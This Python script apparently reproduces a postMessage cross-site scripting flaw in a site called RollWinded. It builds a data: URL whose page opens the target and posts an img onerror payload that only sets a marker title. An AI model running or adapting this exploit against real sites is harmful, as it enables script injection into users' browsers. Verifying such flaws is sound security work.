#!/usr/bin/env python3

import sys
from urllib.parse import quote


if len(sys.argv) != 2:
    raise SystemExit(
        "Usage: python3 rollwinded-build-data-url.py <fresh-rollwinded-host>"
    )

host = sys.argv[1].strip()
host = host.removeprefix("https://").removeprefix("http://").rstrip("/")

if not host or any(character.isspace() for character in host):
    raise SystemExit("Provide only the fresh RollWinded hostname.")

sender_html = (
    '<!doctype html><meta charset=utf-8><title>RollWinded Sender</title>'
    '<button id=b style="font-size:24px;padding:20px">'
    'Send controlled message</button>'
    "<script>b.onclick=()=>{let w=open('https://"
    + host
    + "/');setTimeout(()=>w.postMessage("
    + "'<img src=x onerror=\"document.title=\\'MMP_EXECUTED\\'\">"
    + "<span>MMP_MARKER</span>','*'),3000)}</script>"
)

# Preserve the argument-separating comma used in the archived sender URL, then
# encode the timeout comma to match the exact reproduced payload format.
encoded_sender = quote(sender_html, safe="-_.!~*'(),")
encoded_sender = encoded_sender.replace("),3000", ")%2C3000")
print("data:text/html," + encoded_sender)
